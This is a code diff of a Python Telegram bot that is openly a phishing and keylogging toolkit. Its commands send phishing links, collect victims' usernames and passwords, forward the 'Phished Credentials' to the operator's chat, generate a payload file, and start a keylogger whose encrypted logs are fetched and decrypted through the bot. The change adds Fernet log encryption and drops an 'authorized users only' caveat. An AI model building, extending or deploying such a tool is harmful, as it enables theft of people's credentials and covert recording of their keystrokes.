@@ -1,52 +1,60 @@
 import os
 import telebot
 from telethon import TelegramClient
-import threading 
+import threading
 import asyncio
 import requests
 import keylogger
+from cryptography.fernet import Fernet
+from flask import Flask, request
 
-# Load environment variables
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-YOUR_CHAT_ID = os.getenv("YOUR_CHAT_ID")
-API_ID = os.getenv("API_ID")  # Telegram API ID
-API_HASH = os.getenv("API_HASH")  # Telegram API Hash
+# --- Load Environment Variables ---
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+YOUR_CHAT_ID = os.environ.get("YOUR_CHAT_ID")
+API_ID = os.environ.get("API_ID")
+API_HASH = os.environ.get("API_HASH")
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
-# Initialize the Telegram bot
+# --- Initialize Telegram Bot and Telethon Client ---
 bot = telebot.TeleBot(BOT_TOKEN)
+client = TelegramClient("session_name", API_ID, API_HASH)
+
+app = Flask(__name__)
+
+# --- Keylogger Thread ---
 keylogger_thread = None
 
+# --- Fernet Encryption ---
+def load_key():
+    try:
+        with open(keylogger.KEY_FILE, "rb") as file:
+            return Fernet(file.read())
+    except FileNotFoundError:
+        print("Encryption key not found!")
+        return None
 
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
-
-# Initialize Telethon client
-client = TelegramClient('session_name', API_ID, API_HASH)
+cipher = load_key()
 
 # 1. Welcome Handler
-@bot.message_handler(commands=['start', 'hello'])
+@bot.message_handler(commands=["start", "hello"])
 def send_welcome(message):
-    bot.reply_to(message, "H3ll0 H4CK3R! Type /phish to begin phishing simulation.")
+    bot.reply_to(message, "👋 H3ll0 H4CK3R! Type /phish to begin phishing simulation.")
 
-# 5. Help Command
-@bot.message_handler(commands=['help'])
+@bot.message_handler(commands=["help"])
 def send_help(message):
     help_text = (
         "📖 *Available Commands:*\n\n"
         "/start or /hello - Welcome message to get started.\n"
         "/phish - Sends a phishing link.\n"
         "/credentials - Collects and displays username and password.\n"
-        "/payload - Generates and sends a secure payload file (for authorized users only).\n"
+        "/payload - Generates and sends a secure payload file.\n"
         "/target - Start phishing for a target group or username.\n"
         "/startkeylogger - Starts the keylogger process.\n"
         "/stopkeylogger - Stops the keylogger process.\n"
         "/keylogs - Fetches and sends encrypted keylogs.\n"
         "/decryptlogs - Decrypts and displays encrypted logs.\n"
         "/help - Displays this help message.\n\n"
-        "💡 *Additional Features:*\n"
-        "- All messages are logged for review.\n"
-        "- Responses are securely forwarded to the admin.\n"
-        "- Mass messaging capability using Telethon.\n\n"
-        "⚠️ *Note:* Use responsibly and only for educational or authorized purposes."
+        "⚠️ *Note:* Use responsibly and only for educational purposes."
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
 
@@ -80,9 +88,6 @@ def forward_credentials(message, username):
     bot.send_message(message.chat.id, "Thank you for verifying your credentials! ✅")
     # Send the credentials to your designated chat
     bot.send_message(YOUR_CHAT_ID, f"Phished Credentials:\nUsername: {username}\nPassword: {password}")
-
-import subprocess
-import os
 
 @bot.message_handler(commands=['payload'])
 def send_payload(message):
@@ -158,20 +163,19 @@ def log_responses(message):
         bot.reply_to(message, f"⚠️ Error logging response: {e}")
 
 
-# Start Keylogger Command
-@bot.message_handler(commands=['startkeylogger'])
-def start_keylogger(message):
+@bot.message_handler(commands=["startkeylogger"])
+def start_keylogger_handler(message):
     global keylogger_thread
     if keylogger_thread is None or not keylogger_thread.is_alive():
         bot.reply_to(message, "🔄 Starting the keylogger...")
-        keylogger_thread = threading.Thread(target=keylogger.start_keylogger, daemon=True)
+        keylogger_thread = threading.Thread(target=keylogger.background_process, daemon=True)
         keylogger_thread.start()
         bot.reply_to(message, "✅ Keylogger started successfully.")
     else:
         bot.reply_to(message, "⚠️ Keylogger is already running.")
 
-@bot.message_handler(commands=['stopkeylogger'])
-def stop_keylogger(message):
+@bot.message_handler(commands=["stopkeylogger"])
+def stop_keylogger_handler(message):
     global keylogger_thread
     if keylogger_thread and keylogger_thread.is_alive():
         keylogger.stop_keylogger()
@@ -181,65 +185,62 @@ def stop_keylogger(message):
     else:
         bot.reply_to(message, "⚠️ Keylogger is not running.")
 
-# Fetch Keylogs Command
-@bot.message_handler(commands=['keylogs'])
-def fetch_keylogs(message):
+@bot.message_handler(commands=["keylogs"])
+def fetch_keylogs_handler(message):
     try:
-        with open("keylogs.txt", "rb") as file:
-            logs = file.read()
-            encrypted_logs = cipher.encrypt(logs)
+        with open(keylogger.ENCRYPTED_LOG_FILE, "rb") as enc_file:
+            encrypted_logs = enc_file.read()
 
-        # Send the encrypted logs
+        # Send encrypted logs
         bot.reply_to(message, "📤 Sending encrypted keylogs...")
-        bot.send_document(message.chat.id, (f"keylogs_encrypted.txt", encrypted_logs))
-        bot.reply_to(message, "✅ Keylogs sent successfully.")
+        bot.send_document(message.chat.id, ("keylogs.enc", encrypted_logs))
     except FileNotFoundError:
-        bot.reply_to(message, "⚠️ No keylogs found.")
+        bot.reply_to(message, "⚠️ No encrypted keylogs found.")
     except Exception as e:
         bot.reply_to(message, f"❌ Error fetching keylogs: {e}")
 
-# Decrypt Logs Locally Command
-@bot.message_handler(commands=['decryptlogs'])
-def decrypt_logs(message):
+@bot.message_handler(commands=["decryptlogs"])
+def decrypt_logs_handler(message):
     try:
-        with open("keylogs_encrypted.txt", "rb") as file:
-            encrypted_logs = file.read()
+        with open(keylogger.ENCRYPTED_LOG_FILE, "rb") as enc_file:
+            encrypted_logs = enc_file.read()
         decrypted_logs = cipher.decrypt(encrypted_logs).decode()
 
         bot.reply_to(message, f"🔓 Decrypted Logs:\n\n{decrypted_logs}")
     except Exception as e:
         bot.reply_to(message, f"❌ Error decrypting logs: {e}")
 
-import os
-from flask import Flask, request
-
-app = Flask(__name__)
-
+# --- Flask Routes ---
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def receive_update():
     json_update = request.get_json()
     bot.process_new_updates([telebot.types.Update.de_json(json_update)])
-    return "!", 200
+    return "OK", 200
 
 # Set webhook for Telegram bot
+@app.route("/")
+def home():
+    return "Bot is running!"
+
+# --- Webhook Setup ---
 def set_webhook():
     bot.remove_webhook()
     bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")
 
-@app.route('/')
-def home():
-    return "Bot is running!"
-
 def run_flask():
     port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no PORT is set
     app.run(host="0.0.0.0", port=port)
-    
-# Run both Flask and Telegram bot
+
+# --- Main Entry Point ---
 if __name__ == "__main__":
-    # Set webhook before starting Flask
+    # Ensure webhook is set
     set_webhook()
 
-    flask_thread = threading.Thread(target=run_flask)
+    # Run Flask in a separate thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
+
+    # Start polling the bot
+    bot.infinity_polling()
 
 
